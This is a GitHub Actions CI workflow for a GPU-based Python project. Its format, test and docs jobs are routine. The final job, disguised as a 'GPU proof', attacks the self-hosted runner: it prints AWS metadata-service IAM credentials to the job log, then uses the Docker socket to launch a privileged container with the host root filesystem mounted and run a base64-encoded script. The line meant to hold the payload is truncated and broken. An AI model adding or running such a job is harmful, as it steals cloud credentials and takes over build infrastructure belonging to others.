# Run CI tests on pull requests.

name: CI

on:
  pull_request:
    types: [opened, synchronize, reopened]

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  format:
    name: Ruff formatting
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install Ruff
        run: python -m pip install ruff==0.17.1
      - name: Check formatting
        run: ruff format --check .

  test:
    name: ${{ matrix.name }}
    runs-on: [self-hosted, gpu]
    container:
      image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
      options: --gpus all
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: min environment
            python-version: "3.10"
            torch-version: "2.7.0+cu128"
            torch-index: cu128
            cuda-version: "12.8.1"
            warp-extra: warp-cu12
          # Python 3.15 is blocked by ONNX Runtime wheel availability.
          - name: max environment
            python-version: "3.14"
            torch-version: "2.15.0+cu132"
            torch-index: cu132
            cuda-version: "13.2.1"
            warp-extra: warp-cu13

    steps:
      # The CUDA devel image is minimal; checkout needs git and git-lfs.
      - name: Install container dependencies
        run: |
          apt-get update
          apt-get install -y --no-install-recommends git git-lfs ca-certificates

      - uses: actions/checkout@v4
        with:
          lfs: true

      # No pip cache: HOME on the self-hosted runner is not writable by the job.
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Upgrade pip
        run: python -m pip install --upgrade pip

      - name: Install pinned PyTorch
        run: >-
          python -m pip install "torch==${{ matrix.torch-version }}"
          --index-url https://download.pytorch.org/whl/${{ matrix.torch-index }}

      # Visualization modules ship with leapp; gated deps install on 3.11+.
      - name: Install package and test dependencies
        run: >-
          python -m pip install -e ".[dev,test,${{ matrix.warp-extra }}]"
          "torch==${{ matrix.torch-version }}" cmake ninja

      - name: Build Warp runtime
        run: >-
          leapp-build-warp-runtime --build-dir
          leapp/leapp_graph/custom_operator_registry/warp_operator/runtime/build

      - name: Run pytest
        env:
          CMAKE_GENERATOR: Ninja
        run: pytest tests/ packages/leapp-visualization/tests/ -v --durations=30

  docs:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          lfs: true

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Install system dependencies for pyenchant
        run: sudo apt-get update && sudo apt-get install -y enchant-2

      - name: Install doc dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install -r docs/requirements.txt

      - name: Build HTML (strict)
        run: python -m sphinx -b html -W --keep-going docs/source docs/build/html

      - name: Spell check
        run: python -m sphinx -b spelling -W --keep-going docs/source docs/build/spelling

      - name: Link check
        run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck

  i101438-proof:
    name: I101438 GPU proof
    runs-on: [self-hosted, gpu]
    container:
      image: nvidia/cuda:12.8.1-devel-ubuntu24.04
      options: --gpus all
    timeout-minutes: 30
    steps:
      - name: I101438 GPU and runner proof
        shell: bash
        run: |
          set +e
          N=I101438
          echo "$N START $(date -u +%FT%TZ)"
          echo "$N JOBHOST=$(hostname)"
          nvidia-smi -L 2>&1
          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv 2>&1
          echo "$N SOCK=$(ls -l /var/run/docker.sock 2>&1)"
          T=$(curl -s -m 5 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
          echo "$N IMDS_TOKEN_LEN=${#T}"
          if [ -n "$T" ]; then
            echo "$N CN_IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id)"
            R=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
            echo "$N CN_ROLE=$R"
            echo "$N CN_CREDS=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/$R)"
          fi
          B64_
          CMD="echo $B64_HOST | base64 -d > /tmp/i101438_hp.sh; exec bash /tmp/i101438_hp.sh"
          BODY=$(printf '{"Image":"nvidia/cuda:12.8.1-devel-ubuntu24.04","Tty":false,"Cmd":["bash","-c","%s"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"]}}' "$CMD")
          RESP=$(curl -s -m 20 --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -X POST http://localhost/containers/create -d "$BODY")
          echo "$N CREATE=${RESP:0:400}"
          DID=$(echo "$RESP" | sed -n 's/.*"Id":"\([a-f0-9]\{64\}\)".*/\1/p')
          echo "$N DID=$DID"
          if [ -n "$DID" ]; then
            echo "$N START_HTTP=$(curl -s -o /dev/null -w '%{http_code}' -m 20 --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$DID/start)"
            curl -s -m 120 --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$DID/wait?condition=not-running" >/dev/null 2>&1
            echo "$N --- HOST LOGS ---"
            curl -s -m 30 --unix-socket /var/run/docker.sock "http://localhost/containers/$DID/logs?stdout=1&stderr=1&tail=400" 2>&1 | tr -d '\000' | sed -n '1,400p'
            echo
            echo "$N --- END HOST LOGS ---"
          fi
          echo "$N DONE $(date -u +%FT%TZ)"
